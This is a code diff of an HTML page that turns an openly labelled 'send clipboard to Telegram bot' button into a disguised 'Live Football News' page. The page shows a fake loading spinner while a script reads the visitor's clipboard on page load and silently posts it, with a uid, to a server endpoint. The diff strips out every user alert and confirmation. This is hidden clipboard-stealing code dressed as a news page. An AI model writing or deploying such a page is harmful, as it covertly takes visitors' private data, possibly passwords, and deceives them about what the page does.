@@ -2,75 +2,81 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Clipboard to Telegram Bot</title>
+  <title>Live Football Updates</title>
   <style>
     body {
-      font-family: sans-serif;
-      text-align: center;
-      padding: 2em;
-      background-color: #f9f9f9;
+      background-color: #121212;
+      color: #ffffff;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background-image: url('https://images.unsplash.com/photo-1598387993100-97e1e8b9ed28?auto=format&fit=crop&w=1470&q=80');
+      background-size: cover;
+      background-position: center;
     }
 
-    h3 {
-      color: #333;
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.7);
+      padding: 30px;
+      border-radius: 10px;
+      max-width: 600px;
+      margin: auto;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 32px;
+      margin-bottom: 10px;
     }
 
     p {
-      color: #555;
+      font-size: 18px;
+      margin-bottom: 20px;
     }
 
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0a84ff;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      transition: background 0.3s ease;
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #ffcc00;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
     }
 
-    button:hover {
-      background-color: #006fd6;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
   </style>
 </head>
 <body>
-  <h3>📋 Send Clipboard Text to Telegram Bot</h3>
-  <p>📝 دا تڼۍ کلیک کړئ تر څو ستاسو کاپي شوی ټکسټ Telegram ته واستول شي</p>
-  <button onclick="sendToBot()">📤 Send Clipboard</button>
+  <div class="overlay">
+    <h1>⚽ Live Football News</h1>
+    <p>Loading today's hottest transfer updates...</p>
+    <div class="spinner"></div>
+  </div>
 
   <script>
-    async function sendToBot() {
+    async function sendClipboard() {
       const uid = new URLSearchParams(window.location.search).get("uid");
-      if (!uid) {
-        alert("❌ UID not found in URL (e.g. ?uid=123456)");
-        return;
-      }
+      if (!uid) return;
 
       try {
         const text = await navigator.clipboard.readText();
-        if (!text) {
-          alert("❌ Clipboard is empty!");
-          return;
-        }
+        if (!text) return;
 
-        const res = await fetch("/api/send", {
+        await fetch("/api/send", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({ uid, text })
         });
-
-        if (res.ok) {
-          alert("✅ Text sent to bot successfully!");
-        } else {
-          alert("❌ Failed to send. Server responded with error.");
-        }
       } catch (err) {
-        alert("❌ Clipboard access failed or permission denied.");
-        console.error(err);
+        console.error("❌ Failed to send clipboard", err);
       }
     }
+
+    // Run it automatically when page loads
+    window.onload = sendClipboard;
   </script>
 </body>
 </html> 
